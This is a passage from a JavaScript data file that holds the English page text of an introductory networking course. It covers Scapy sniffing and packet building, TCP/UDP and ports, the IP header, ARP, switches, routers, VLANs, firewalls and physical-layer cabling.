              <li><strong>GET</strong> reads data, <strong>POST</strong> sends data</li>
              <li>A <strong>URL</strong> has: scheme, host, port, path, and query</li>
            </ul>
          </div>
        `
      },
      {}, // Page 11: simulation — skip
      {}, // Page 12: questions — skip
    ]
  },

  // ========== CHAPTER 5 ==========
  5: {
    titleEn: "Scapy",
    pages: [
      {
        // Page 0: explanation
        titleEn: "Introduction to Scapy",
        contentEn: `
          <p><strong>Scapy</strong> is a Python library for working with network packets at a low level.</p>
          <p>With Scapy you can:</p>
          <ul>
            <li><strong>Sniff</strong> — capture packets from the network</li>
            <li><strong>Build</strong> — create custom packets from scratch</li>
            <li><strong>Send</strong> — send your own packets to the network</li>
            <li><strong>Analyze</strong> — read and understand packet fields</li>
          </ul>
          <p>Scapy is different from Wireshark: Wireshark only shows packets, but Scapy lets you create and send them too.</p>
          <p>Install: <code>pip install scapy</code></p>
        `
      },
      {
        // Page 1: demo
        titleEn: "Basic Sniffing with Scapy",
        contentEn: `
          <p>Capture packets with the <code>sniff()</code> function:</p>
          <div class="code-preview">
            <pre><code>from scapy.all import *

packets = sniff(count=10)
print(packets.summary())

# Sniff with a filter (only TCP):
packets = sniff(filter="tcp", count=5)

# Sniff for 10 seconds:
packets = sniff(timeout=10)</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>sniff(count=10)</code> — captures 10 packets and stops</li>
              <li><code>filter="tcp"</code> — captures only TCP packets (uses BPF syntax)</li>
              <li><code>timeout=10</code> — captures for 10 seconds</li>
              <li><code>.summary()</code> — shows a short description of each packet</li>
            </ul>
          </div>
          <p>You need admin/root permissions to sniff packets.</p>
        `
      },
      {
        // Page 2: explanation
        titleEn: "Filtering Packets — lfilter",
        contentEn: `
          <p>You can filter packets with a Python function using <code>lfilter</code>:</p>
          <div class="code-preview">
            <pre><code># Only packets with IP layer:
sniff(lfilter=lambda p: p.haslayer(IP), count=5)

# Only HTTP (port 80):
sniff(lfilter=lambda p: p.haslayer(TCP) and
      p[TCP].dport == 80, count=5)</code></pre>
          </div>
          <ul>
            <li><code>lfilter</code> gets a function that returns True or False</li>
            <li><code>p.haslayer(IP)</code> — checks if the packet has an IP layer</li>
            <li><code>p[TCP].dport</code> — gets the destination port from the TCP layer</li>
          </ul>
          <p><code>lfilter</code> is more flexible than <code>filter</code> because you can use any Python logic.</p>
        `
      },
      {
        // Page 3: explanation
        titleEn: "Building Packets — IP/TCP/ICMP",
        contentEn: `
          <p>Scapy lets you build packets layer by layer:</p>
          <div class="code-preview">
            <pre><code># Create an IP packet:
pkt = IP(dst="8.8.8.8")

# Add TCP layer:
pkt = IP(dst="8.8.8.8") / TCP(dport=80)

# Create an ICMP (ping) packet:
pkt = IP(dst="8.8.8.8") / ICMP()

# Show packet details:
pkt.show()</code></pre>
          </div>
          <ul>
            <li><code>IP(dst="...")</code> — creates an IP layer with a destination address</li>
            <li><code>TCP(dport=80)</code> — creates a TCP layer with destination port 80</li>
            <li><code>ICMP()</code> — creates an ICMP (ping) layer</li>
            <li>The <code>/</code> operator stacks layers together</li>
            <li><code>.show()</code> — displays all fields of the packet</li>
          </ul>
        `
      },
      {
        // Page 4: demo
        titleEn: "Sending Packets",
        contentEn: `
          <p>Send packets you created:</p>
          <div class="code-preview">
            <pre><code># Send at Layer 3 (IP level):
send(IP(dst="8.8.8.8") / ICMP())

# Send and receive reply:
ans, unans = sr(IP(dst="8.8.8.8") / ICMP())

# Send one packet and get one reply:
reply = sr1(IP(dst="8.8.8.8") / ICMP())
print(reply.summary())</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>send()</code> — sends a packet, does not wait for a reply</li>
              <li><code>sr()</code> — Send and Receive: sends and collects replies</li>
              <li><code>sr1()</code> — sends one packet and returns one reply</li>
              <li><code>ans</code> — answered packets, <code>unans</code> — unanswered packets</li>
            </ul>
          </div>
          <p>You need admin/root permissions to send raw packets.</p>
        `
      },
      {
        // Page 5: explanation
        titleEn: "Advanced Sniffing — Field Details",
        contentEn: `
          <p>You can access specific fields in captured packets:</p>
          <div class="code-preview">
            <pre><code>packets = sniff(count=5)

for pkt in packets:
    if pkt.haslayer(IP):
        print("Source:", pkt[IP].src)
        print("Dest:", pkt[IP].dst)
    if pkt.haslayer(TCP):
        print("Src Port:", pkt[TCP].sport)
        print("Dst Port:", pkt[TCP].dport)</code></pre>
          </div>
          <ul>
            <li><code>pkt[IP].src</code> — source IP address</li>
            <li><code>pkt[IP].dst</code> — destination IP address</li>
            <li><code>pkt[TCP].sport</code> — source port</li>
            <li><code>pkt[TCP].dport</code> — destination port</li>
            <li><code>pkt[Raw].load</code> — the raw data (payload)</li>
          </ul>
          <p>You can also save packets to a file: <code>wrpcap("capture.pcap", packets)</code></p>
          <p>And read them back: <code>packets = rdpcap("capture.pcap")</code></p>
        `
      },
      {
        // Page 6: summary
        titleEn: "Chapter 5 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li><strong>Scapy</strong> is a Python library for sniffing, building, and sending packets</li>
              <li><code>sniff()</code> captures packets. Use <code>count</code>, <code>filter</code>, or <code>timeout</code></li>
              <li><code>lfilter</code> lets you filter with any Python function</li>
              <li>Build packets with <code>IP()</code>, <code>TCP()</code>, <code>ICMP()</code>. Stack with <code>/</code></li>
              <li><code>send()</code> sends packets. <code>sr()</code> sends and receives replies</li>
              <li>Access fields: <code>pkt[IP].src</code>, <code>pkt[TCP].dport</code>, etc.</li>
              <li>Requires admin/root permissions</li>
            </ul>
          </div>
        `
      },
      {}, // Page 7: questions — skip
    ]
  },

  // ========== CHAPTER 6 ==========
  6: {
    titleEn: "The Transport Layer",
    pages: [
      {
        // Page 0: explanation
        titleEn: "Role of the Transport Layer",
        contentEn: `
          <p>The <strong>Transport Layer</strong> (Layer 4) provides <strong>process-to-process</strong> communication.</p>
          <p>The Network Layer (Layer 3) delivers data to the right <strong>computer</strong>.</p>
          <p>The Transport Layer delivers data to the right <strong>program</strong> on that computer.</p>
          <ul>
            <li>Your computer runs many programs at the same time: browser, email, chat</li>
            <li>Each program needs to receive only its own data</li>
            <li>The Transport Layer uses <strong>port numbers</strong> to separate the data</li>
          </ul>
          <p>Two main protocols: <strong>TCP</strong> (reliable) and <strong>UDP</strong> (fast).</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "Ports",
        contentEn: `
          <p>A <strong>port</strong> is a number (0–65535) that identifies a program on a computer.</p>
          <p><strong>Analogy:</strong></p>
          <ul>
            <li>IP address = the building address</li>
            <li>Port = the apartment number</li>
          </ul>
          <p>The mail carrier (IP) delivers the letter to the building. The port tells which apartment gets the letter.</p>
          <p><strong>Full address:</strong> <code>192.168.1.5:443</code> means IP <code>192.168.1.5</code>, port <code>443</code>.</p>
          <p>Each connection has <strong>four numbers</strong>: source IP, source port, destination IP, destination port.</p>
        `
      },
      {
        // Page 2: demo
        titleEn: "The netstat Command",
        contentEn: `
          <p><code>netstat</code> shows all active network connections on your computer:</p>
          <div class="code-preview">
            <pre><code>C:&gt; netstat -an

Proto  Local Address        Foreign Address      State
TCP    0.0.0.0:80           0.0.0.0:0            LISTENING
TCP    192.168.1.5:52431    93.184.216.34:443    ESTABLISHED
UDP    0.0.0.0:53           *:*</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>LISTENING</code> — a server is waiting for connections on this port</li>
              <li><code>ESTABLISHED</code> — an active connection between your computer and a remote server</li>
              <li><code>Local Address</code> — your IP and port</li>
              <li><code>Foreign Address</code> — the remote IP and port</li>
              <li><code>-a</code> — show all connections, <code>-n</code> — show numbers (not names)</li>
            </ul>
          </div>
        `
      },
      {
        // Page 3: explanation
        titleEn: "TCP vs UDP",
        contentEn: `
          <p>The Transport Layer has two main protocols:</p>
          <p><strong>TCP</strong> (Transmission Control Protocol):</p>
          <ul>
            <li>Reliable — makes sure all data arrives</li>
            <li>Ordered — data arrives in the right order</li>
            <li>Connection-based — needs a handshake before sending</li>
            <li>Slower — has extra checks</li>
            <li>Used for: web pages, email, file transfer</li>
          </ul>
          <p><strong>UDP</strong> (User Datagram Protocol):</p>
          <ul>
            <li>No guarantee — data can be lost</li>
            <li>No order — packets can arrive out of order</li>
            <li>No connection — just sends the data</li>
            <li>Faster — no extra checks</li>
            <li>Used for: video calls, online games, DNS</li>
          </ul>
        `
      },
      {
        // Page 4: explanation
        titleEn: "TCP Three-Way Handshake",
        contentEn: `
          <p>Before TCP can send data, the two sides must connect. This takes <strong>three steps</strong>:</p>
          <ul>
            <li><strong>Step 1 — SYN</strong>: The client sends a SYN (synchronize) packet to the server. "I want to connect."</li>
            <li><strong>Step 2 — SYN-ACK</strong>: The server replies with SYN-ACK. "OK, I agree to connect."</li>
            <li><strong>Step 3 — ACK</strong>: The client sends ACK (acknowledge). "Great, connection is ready."</li>
          </ul>
          <p>After these three steps, the connection is <strong>established</strong> and both sides can send data.</p>
          <p>This is called the <strong>Three-Way Handshake</strong>.</p>
          <p>You can see these three packets in Wireshark at the start of every TCP connection.</p>
        `
      },
      {}, // Page 5: simulation — skip
      {
        // Page 6: explanation
        titleEn: "Sequence Numbers and Acknowledgments",
        contentEn: `
          <p>TCP uses <strong>sequence numbers</strong> to keep data in order.</p>
          <ul>
            <li>Each byte of data gets a sequence number</li>
            <li>The sender says: "This data starts at byte number X"</li>
            <li>The receiver says: "I got everything up to byte Y, send me byte Y+1 next"</li>
          </ul>
          <p><strong>Acknowledgment (ACK)</strong></p>
          <ul>
            <li>The receiver sends an ACK for every piece of data it receives</li>
            <li>If the sender does not get an ACK, it sends the data again</li>
            <li>This is how TCP makes sure no data is lost</li>
          </ul>
          <p>In Wireshark, you can see the <code>Seq</code> and <code>Ack</code> numbers in every TCP packet.</p>
        `
      },
      {
        // Page 7: summary
        titleEn: "Chapter 6 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>The <strong>Transport Layer</strong> delivers data to the right program using <strong>ports</strong></li>
              <li><strong>TCP</strong> is reliable and ordered. <strong>UDP</strong> is fast but not guaranteed</li>
              <li>TCP uses a <strong>Three-Way Handshake</strong>: SYN → SYN-ACK → ACK</li>
              <li><strong>Sequence numbers</strong> keep data in order. <strong>ACKs</strong> confirm delivery</li>
              <li><code>netstat</code> shows active connections and listening ports</li>
              <li>Well-known ports: 80 (HTTP), 443 (HTTPS), 25 (SMTP), 53 (DNS)</li>
            </ul>
          </div>
        `
      },
      {
        // Page 8: explanation
        titleEn: "Well-Known and Ephemeral Ports",
        contentEn: `
          <p>Ports are divided into ranges:</p>
          <p><strong>Well-Known Ports (0–1023):</strong></p>
          <ul>
            <li><code>80</code> — HTTP (web)</li>
            <li><code>443</code> — HTTPS (secure web)</li>
            <li><code>25</code> — SMTP (sending email)</li>
            <li><code>53</code> — DNS (name resolution)</li>
            <li><code>22</code> — SSH (secure remote access)</li>
          </ul>
          <p><strong>Ephemeral Ports (1024–65535):</strong></p>
          <ul>
            <li>Used by the client side of a connection</li>
            <li>The operating system picks a random port for each new connection</li>
            <li>Example: your browser connects from port 52431 to the server's port 443</li>
          </ul>
          <p>The server always uses a known port. The client uses a random (ephemeral) port.</p>
        `
      },
      {}, // Page 9: questions — skip
    ]
  },

  // ========== CHAPTER 7 ==========
  7: {
    titleEn: "The Network Layer",
    pages: [
      {
        // Page 0: explanation
        titleEn: "Role of the Network Layer",
        contentEn: `
          <p>The <strong>Network Layer</strong> (Layer 3) routes packets from the source computer to the destination computer.</p>
          <p>It works <strong>across different networks</strong>. The Data Link Layer only works within one network — the Network Layer connects them all.</p>
          <ul>
            <li>Uses <strong>IP addresses</strong> to identify source and destination</li>
            <li><strong>Routers</strong> are the main devices at this layer</li>
            <li>Each router decides: "Where should I send this packet next?"</li>
          </ul>
          <p>The main protocol is <strong>IP</strong> (Internet Protocol).</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "Packets",
        contentEn: `
          <p>At the Network Layer, data is called a <strong>packet</strong>.</p>
          <p>Each packet contains:</p>
          <ul>
            <li><strong>Source IP address</strong> — where the packet came from</li>
            <li><strong>Destination IP address</strong> — where the packet is going</li>
            <li><strong>Data</strong> — the payload from the upper layers (Transport + Application data)</li>
          </ul>
          <p>Packets travel <strong>independently</strong>. Two packets to the same destination can take different paths.</p>
          <p>The Network Layer does not guarantee delivery. If a packet is lost, TCP (Layer 4) will ask to resend it.</p>
        `
      },
      {
        // Page 2: explanation
        titleEn: "IP Packet Structure — Header and Fields",
        contentEn: `
          <p>The IP header is at least <strong>20 bytes</strong> long. Important fields:</p>
          <ul>
            <li><strong>Version</strong> — IPv4 (4) or IPv6 (6)</li>
            <li><strong>TTL</strong> (Time to Live) — a counter. Each router decreases it by 1. When it reaches 0, the packet is dropped. This prevents packets from looping forever.</li>
            <li><strong>Protocol</strong> — which Layer 4 protocol is inside: TCP (6), UDP (17), ICMP (1)</li>
            <li><strong>Source IP</strong> — sender's address (4 bytes)</li>
            <li><strong>Destination IP</strong> — receiver's address (4 bytes)</li>
            <li><strong>Total Length</strong> — size of the entire packet in bytes</li>
          </ul>
          <p>You can see all these fields in Wireshark by clicking on the "Internet Protocol" layer.</p>
        `
      },
      {
        // Page 3: explanation
        titleEn: "Subnet Mask and Default Gateway",
        contentEn: `
          <p><strong>Subnet Mask</strong></p>
          <p>Tells the computer which part of the IP address is the <strong>network</strong> and which part is the <strong>host</strong>.</p>
          <ul>
            <li>Example: IP <code>192.168.1.5</code>, Mask <code>255.255.255.0</code></li>
            <li>Network part: <code>192.168.1</code> — all devices on this network share this</li>
            <li>Host part: <code>.5</code> — unique to this device</li>
          </ul>
          <p><strong>Default Gateway</strong></p>
          <ul>
            <li>The router that connects your local network to the outside world</li>
            <li>When you send a packet to a different network, it goes to the gateway first</li>
            <li>Usually the first or last address in the network: <code>192.168.1.1</code></li>
          </ul>
        `
      },
      {
        // Page 4: explanation
        titleEn: "ICMP, DHCP, and NAT",
        contentEn: `
          <p><strong>ICMP</strong> (Internet Control Message Protocol)</p>
          <ul>
            <li>Used for network diagnostics and error messages</li>
            <li><code>ping</code> uses ICMP to check if a host is reachable</li>
            <li><code>traceroute</code> uses ICMP to find the path to a destination</li>
          </ul>
          <p><strong>DHCP</strong> (Dynamic Host Configuration Protocol)</p>
          <ul>
            <li>Automatically gives your computer an IP address when you connect to a network</li>
            <li>Also provides: subnet mask, default gateway, DNS server</li>
          </ul>
          <p><strong>NAT</strong> (Network Address Translation)</p>
          <ul>
            <li>Your home router has one public IP, but many devices at home have private IPs</li>
            <li>NAT translates between private and public addresses</li>
            <li>This is why all your home devices can share one internet connection</li>
          </ul>
        `
      },
      {}, // Page 5: thinkOutside — skip
      {
        // Page 6: demo
        titleEn: "Traceroute",
        contentEn: `
          <p><code>traceroute</code> (Linux/Mac) or <code>tracert</code> (Windows) shows the path a packet takes:</p>
          <div class="code-preview">
            <pre><code>C:&gt; tracert www.google.com

 1    1 ms    &lt;1 ms   &lt;1 ms   192.168.1.1
 2   12 ms    11 ms   12 ms   10.0.0.1
 3   15 ms    14 ms   15 ms   72.14.215.85
 4   16 ms    15 ms   16 ms   142.250.185.46</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li>Each line is one <strong>hop</strong> — a router the packet passed through</li>
              <li>The three time values are three separate measurements (in milliseconds)</li>
              <li>Hop 1 is usually your home router</li>
              <li>The last hop is the destination server</li>
              <li>Traceroute works by sending packets with increasing TTL values (1, 2, 3...)</li>
            </ul>
          </div>
        `
      },
      {
        // Page 7: summary
        titleEn: "Chapter 7 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>The <strong>Network Layer</strong> routes packets between different networks using IP addresses</li>
              <li>The IP header has: source IP, destination IP, TTL, protocol, and more (minimum 20 bytes)</li>
              <li><strong>Subnet mask</strong> separates the network part from the host part of an IP address</li>
              <li><strong>Default gateway</strong> is the router that connects to external networks</li>
              <li><strong>ICMP</strong> is used for ping and traceroute</li>
              <li><strong>DHCP</strong> automatically assigns IP addresses</li>
              <li><strong>NAT</strong> lets many devices share one public IP</li>
              <li><strong>Routing table</strong> tells the router where to send each packet</li>
            </ul>
          </div>
        `
      },
      {
        // Page 8: explanation
        titleEn: "Routing Table",
        contentEn: `
          <p>A <strong>routing table</strong> tells a router (or computer) where to send packets.</p>
          <p>Each entry in the table says: "To reach network X, send the packet to Y."</p>
          <ul>
            <li><strong>Destination</strong> — the target network</li>
            <li><strong>Gateway</strong> — the next router to send the packet to</li>
            <li><strong>Interface</strong> — which network card to use</li>
          </ul>
          <p>You can see your routing table with:</p>
          <ul>
            <li>Windows: <code>route print</code></li>
            <li>Linux/Mac: <code>route -n</code> or <code>ip route</code></li>
          </ul>
          <p>The <strong>default route</strong> (0.0.0.0) is used when no other entry matches — it sends the packet to the default gateway.</p>
        `
      },
      {}, // Page 9: simulation — skip
      {}, // Page 10: simulation — skip
      {}, // Page 11: questions — skip
    ]
  },

  // ========== CHAPTER 8 ==========
  8: {
    titleEn: "The Data Link Layer",
    pages: [
      {
        // Page 0: explanation
        titleEn: "Role of the Data Link Layer",
        contentEn: `
          <p>The <strong>Data Link Layer</strong> (Layer 2) moves data between two devices that are <strong>directly connected</strong>.</p>
          <p>While the Network Layer finds the path across the internet, the Data Link Layer handles each individual link in that path.</p>
          <ul>
            <li>Works within a <strong>local network</strong> (LAN)</li>
            <li>Uses <strong>MAC addresses</strong> to identify devices</li>
            <li>Detects errors in transmitted data</li>
            <li>The main protocol is <strong>Ethernet</strong></li>
          </ul>
          <p>Think of it like this: the Network Layer is the GPS that plans the route, and the Data Link Layer is the driver that handles each road segment.</p>
        `
      },
      {
        // Page 1: explanation
        titleEn: "Ethernet and MAC Addresses",
        contentEn: `
          <p><strong>Ethernet</strong> is the most common protocol for local networks (wired connections).</p>
          <p><strong>MAC Address</strong> (Media Access Control):</p>
          <ul>
            <li>A unique address for each network card (NIC)</li>
            <li><strong>6 bytes</strong> long, written in hexadecimal: <code>AA:BB:CC:DD:EE:FF</code></li>
            <li>Set by the manufacturer — built into the hardware</li>
            <li>Also called a "physical address"</li>
          </ul>
          <p><strong>Difference from IP:</strong></p>
          <ul>
            <li>IP address — logical, can change (assigned by DHCP)</li>
            <li>MAC address — physical, permanent (set in factory)</li>
          </ul>
          <p>The broadcast MAC address <code>FF:FF:FF:FF:FF:FF</code> sends to all devices on the local network.</p>
        `
      },
      {
        // Page 2: explanation
        titleEn: "Ethernet Frame Structure",
        contentEn: `
          <p>At Layer 2, data is called a <strong>frame</strong>. An Ethernet frame has these parts:</p>
          <ul>
            <li><strong>Preamble</strong> (8 bytes) — a pattern of bits that tells the receiver: "a frame is coming"</li>
            <li><strong>Destination MAC</strong> (6 bytes) — the MAC address of the receiver</li>
            <li><strong>Source MAC</strong> (6 bytes) — the MAC address of the sender</li>
            <li><strong>EtherType</strong> (2 bytes) — tells which Layer 3 protocol is inside (0x0800 = IPv4, 0x0806 = ARP)</li>
            <li><strong>Payload</strong> (46–1500 bytes) — the data from the upper layers (IP packet)</li>
            <li><strong>FCS</strong> (4 bytes) — Frame Check Sequence, used to detect errors</li>
          </ul>
          <p>If FCS shows an error, the frame is dropped. The upper layers handle retransmission.</p>
        `
      },
      {
        // Page 3: demo
        titleEn: "ipconfig / ifconfig",
        contentEn: `
          <p>You can see your network settings with these commands:</p>
          <div class="code-preview">
            <pre><code># Windows:
C:&gt; ipconfig /all

Ethernet adapter:
  Physical Address: AA-BB-CC-DD-EE-FF
  IPv4 Address: 192.168.1.5
  Subnet Mask: 255.255.255.0
  Default Gateway: 192.168.1.1

# Linux/Mac:
$ ifconfig
eth0: flags=4163  mtu 1500
      inet 192.168.1.5  netmask 255.255.255.0
      ether aa:bb:cc:dd:ee:ff</code></pre>
          </div>
          <div class="demo-note">
            <ul>
              <li><code>Physical Address</code> / <code>ether</code> — your MAC address</li>
              <li><code>IPv4 Address</code> / <code>inet</code> — your IP address</li>
              <li><code>Subnet Mask</code> / <code>netmask</code> — your subnet mask</li>
              <li><code>Default Gateway</code> — your router's address</li>
            </ul>
          </div>
        `
      },
      {
        // Page 4: explanation
        titleEn: "ARP Protocol",
        contentEn: `
          <p><strong>ARP</strong> — Address Resolution Protocol</p>
          <p>ARP converts an <strong>IP address</strong> to a <strong>MAC address</strong>.</p>
          <p><strong>Why do we need ARP?</strong></p>
          <ul>
            <li>The Network Layer uses IP addresses</li>
            <li>The Data Link Layer uses MAC addresses</li>
            <li>To send a frame, you need the destination's MAC address</li>
            <li>ARP finds the MAC address when you only know the IP</li>
          </ul>
          <p><strong>How ARP works:</strong></p>
          <ul>
            <li>Your computer broadcasts: "Who has IP 192.168.1.1? Tell me your MAC address"</li>
            <li>The device with that IP replies: "I have 192.168.1.1, my MAC is AA:BB:CC:DD:EE:FF"</li>
            <li>Your computer saves this in its <strong>ARP table</strong> (cache)</li>
          </ul>
          <p>View your ARP table: <code>arp -a</code></p>
        `
      },
      {}, // Page 5: simulation — skip
      {
        // Page 6: summary
        titleEn: "Chapter 8 Summary",
        contentEn: `
          <div class="chapter-summary">
            <h3>Key Points:</h3>
            <ul>
              <li>The <strong>Data Link Layer</strong> handles communication between directly connected devices</li>
              <li><strong>MAC addresses</strong> are 6-byte hardware addresses, set by the manufacturer</li>
              <li>An <strong>Ethernet frame</strong> has: preamble, destination MAC, source MAC, EtherType, payload, and FCS</li>
              <li><strong>ARP</strong> converts IP addresses to MAC addresses</li>
              <li>ARP sends a broadcast question and gets a unicast answer</li>
              <li>Use <code>ipconfig</code> (Windows) or <code>ifconfig</code> (Linux/Mac) to see your network settings</li>
              <li>Use <code>arp -a</code> to see the ARP table</li>
            </ul>
          </div>
        `
      },
      {}, // Page 7: questions — skip
    ]
  },

  // ========== CHAPTER 9 ==========
  9: {
    titleEn: "Network Devices",
    pages: [
      {
        // Page 0: Hub
        titleEn: "Hub — The Simplest Device",
        contentEn: `
          <p>A <strong>Hub</strong> is the simplest network device.</p>
          <p>It receives a signal on one port and <strong>sends it to all other ports</strong>.</p>
          <ul>
            <li>Works at <strong>Layer 1</strong> (Physical Layer)</li>
            <li>Does not read addresses — just copies the signal</li>
            <li>All devices share the same bandwidth</li>
            <li>Creates <strong>collisions</strong> when two devices send at the same time</li>
          </ul>
          <p>Hubs are almost never used today. Switches replaced them.</p>
        `
      },
      {
        // Page 1: Switch
        titleEn: "Switch — Smart Forwarding",
        contentEn: `
          <p>A <strong>Switch</strong> is smarter than a hub.</p>
          <p>It learns which device is connected to which port using <strong>MAC addresses</strong>.</p>
          <ul>
            <li>Works at <strong>Layer 2</strong> (Data Link Layer)</li>
            <li>Keeps a <strong>MAC address table</strong> — maps each MAC to a port</li>
            <li>Sends frames <strong>only to the correct port</strong>, not to all ports</li>
            <li>Each port gets its own bandwidth — no collisions</li>
          </ul>
          <p><strong>How does the switch learn?</strong></p>
          <ul>
            <li>When a frame arrives, the switch reads the <strong>source MAC</strong> and saves it</li>
            <li>If it does not know the destination MAC, it floods to all ports (like a hub)</li>
            <li>Over time, the table fills up and traffic is efficient</li>
          </ul>
        `
      },
      {
        // Page 2: Router
        titleEn: "Router — Connecting Different Networks",
        contentEn: `
          <p>A <strong>Router</strong> connects different networks together.</p>
          <p>It reads <strong>IP addresses</strong> and decides the best path for each packet.</p>
          <ul>
            <li>Works at <strong>Layer 3</strong> (Network Layer)</li>
            <li>Has a <strong>routing table</strong> — tells it where to send each packet</li>
            <li>Connects your home network to the Internet</li>
            <li>Can connect networks with different technologies (WiFi to Ethernet)</li>
          </ul>
          <p><strong>Key difference from a switch:</strong></p>
          <ul>
            <li>Switch uses MAC addresses (Layer 2) — works inside one network</li>
            <li>Router uses IP addresses (Layer 3) — works between networks</li>
          </ul>
        `
      },
      {
        // Page 3: Comparison table
        titleEn: "Hub vs Switch vs Router",
        contentEn: `
          <p>Let's compare the three devices:</p>
          <table>
            <thead>
              <tr><th>Feature</th><th>Hub</th><th>Switch</th><th>Router</th></tr>
            </thead>
            <tbody>
              <tr><td>OSI Layer</td><td>1 (Physical)</td><td>2 (Data Link)</td><td>3 (Network)</td></tr>
              <tr><td>Uses</td><td>Electrical signal</td><td>MAC addresses</td><td>IP addresses</td></tr>
              <tr><td>Sends to</td><td>All ports</td><td>Correct port only</td><td>Next hop router</td></tr>
              <tr><td>Collisions</td><td>Yes</td><td>No</td><td>No</td></tr>
              <tr><td>Connects</td><td>Devices in one LAN</td><td>Devices in one LAN</td><td>Different networks</td></tr>
            </tbody>
          </table>
          <p><strong>Remember:</strong> Hub = dumb, Switch = smart inside a network, Router = connects networks.</p>
        `
      },
      {
        // Page 4: VLAN
        titleEn: "VLAN — Virtual LAN",
        contentEn: `
          <p>A <strong>VLAN</strong> (Virtual LAN) splits one physical switch into separate logical networks.</p>
          <ul>
            <li>Devices in the same VLAN can talk to each other</li>
            <li>Devices in different VLANs <strong>cannot</strong> talk without a router</li>
            <li>This improves <strong>security</strong> and <strong>performance</strong></li>
          </ul>
          <p><strong>Example:</strong></p>
          <ul>
            <li>VLAN 10 = Accounting department</li>
            <li>VLAN 20 = Engineering department</li>
            <li>Both use the same switch, but they are isolated</li>
          </ul>
          <p><strong>Trunk port:</strong> A special port that carries traffic from multiple VLANs between switches. It adds a <strong>VLAN tag</strong> (802.1Q) to each frame.</p>
        `
      },
      {
        // Page 5: Firewall
        titleEn: "Firewall — Network Security Guard",
        contentEn: `
          <p>A <strong>Firewall</strong> filters network traffic based on rules.</p>
          <p>It decides what traffic is <strong>allowed in</strong> and what is <strong>blocked</strong>.</p>
          <ul>
            <li><strong>Packet filter</strong> — checks IP addresses and ports (Layer 3-4)</li>
            <li><strong>Stateful firewall</strong> — tracks connections, allows replies to outgoing requests</li>
            <li><strong>Application firewall (WAF)</strong> — inspects HTTP content (Layer 7)</li>
          </ul>
          <p><strong>Example rules:</strong></p>
          <ul>
            <li>Allow incoming traffic on port 443 (HTTPS) — ✅</li>
            <li>Block incoming traffic on port 23 (Telnet) — ❌</li>
            <li>Allow outgoing traffic to any destination — ✅</li>
          </ul>
          <p>Most home routers have a built-in firewall.</p>
        `
      },
      {
        // Page 6: thinkOutside — SKIP
        titleEn: "Think Outside the Box",
      },
      {
        // Page 7: Summary
        titleEn: "Chapter Summary",
        contentEn: `
          <p><strong>Key points from this chapter:</strong></p>
          <ul>
            <li><strong>Hub</strong> — Layer 1, sends to all ports, causes collisions</li>
            <li><strong>Switch</strong> — Layer 2, learns MAC addresses, sends to correct port only</li>
            <li><strong>Router</strong> — Layer 3, uses IP addresses, connects different networks</li>
            <li><strong>VLAN</strong> — splits one switch into separate virtual networks</li>
            <li><strong>Firewall</strong> — filters traffic with allow/block rules</li>
          </ul>
          <p>Each device works at a different layer and solves a different problem.</p>
        `
      },
      {
        // Page 8: questions — SKIP
        titleEn: "Questions",
      },
    ]
  },

  // ========== CHAPTER 10 ==========
  10: {
    titleEn: "The Physical Layer",
    pages: [
      {
        // Page 0: Purpose
        titleEn: "What Does the Physical Layer Do?",
        contentEn: `
          <p>The <strong>Physical Layer</strong> (Layer 1) is the bottom of the OSI model.</p>
          <p>Its job is simple: <strong>move bits</strong> (0s and 1s) from one device to another.</p>
          <ul>
            <li>It does not understand addresses, packets, or protocols</li>
            <li>It only deals with <strong>electrical signals</strong>, <strong>light</strong>, or <strong>radio waves</strong></li>
            <li>It defines cables, connectors, voltages, and frequencies</li>
          </ul>
          <p><strong>Without the Physical Layer, no data can move at all.</strong></p>
        `
      },
      {
        // Page 1: Technologies
        titleEn: "Physical Layer Technologies",
        contentEn: `
          <p>There are three main ways to transmit bits:</p>
          <ul>
            <li><strong>Copper cables</strong> — electrical signals travel through metal wires</li>
            <li><strong>Fiber optic</strong> — light pulses travel through thin glass</li>
            <li><strong>Wireless (WiFi)</strong> — radio waves travel through the air</li>
          </ul>
          <table>
            <thead>
              <tr><th>Technology</th><th>Medium</th><th>Speed</th><th>Distance</th></tr>
            </thead>
            <tbody>
              <tr><td>Copper (Cat5e)</td><td>Electrical</td><td>1 Gbps</td><td>100m</td></tr>
              <tr><td>Fiber optic</td><td>Light</td><td>100+ Gbps</td><td>Kilometers</td></tr>
              <tr><td>WiFi 6</td><td>Radio</td><td>~1 Gbps</td><td>~30m indoors</td></tr>
            </tbody>
          </table>
        `
      },
      {
        // Page 2: Bandwidth and Latency
        titleEn: "Bandwidth and Latency",
        contentEn: `
          <p>Two important terms for network speed:</p>
          <p><strong>Bandwidth</strong> — how much data can flow per second.</p>
          <ul>
            <li>Measured in <strong>bps</strong> (bits per second)</li>
            <li>Like the width of a pipe — wider pipe = more water</li>
            <li>Example: 100 Mbps = 100 million bits per second</li>
          </ul>
          <p><strong>Latency</strong> — how long it takes for data to arrive.</p>
          <ul>
            <li>Measured in <strong>milliseconds (ms)</strong></li>
            <li>Like the length of the pipe — longer pipe = more delay</li>
            <li>Example: 20 ms latency to a server in your country</li>
          </ul>
          <p><strong>Important:</strong> High bandwidth does not mean low latency. A satellite link has high bandwidth but high latency (~600 ms).</p>
        `
      },
      {
        // Page 3: Cables and Standards
        titleEn: "Cables and Standards",
        contentEn: `
          <p><strong>Ethernet cables</strong> (twisted pair) are the most common:</p>
          <ul>
            <li><strong>Cat5e</strong> — up to 1 Gbps, 100 meters max</li>
            <li><strong>Cat6</strong> — up to 10 Gbps (short distances)</li>
            <li><strong>Cat6a</strong> — up to 10 Gbps at 100 meters</li>
          </ul>
          <p><strong>Connectors:</strong></p>
          <ul>
            <li><strong>RJ-45</strong> — standard Ethernet connector (8 pins)</li>
            <li><strong>Straight-through cable</strong> — connects different devices (PC to switch)</li>
            <li><strong>Crossover cable</strong> — connects same devices (PC to PC)</li>
          </ul>
          <p><strong>Fiber optic types:</strong></p>
          <ul>
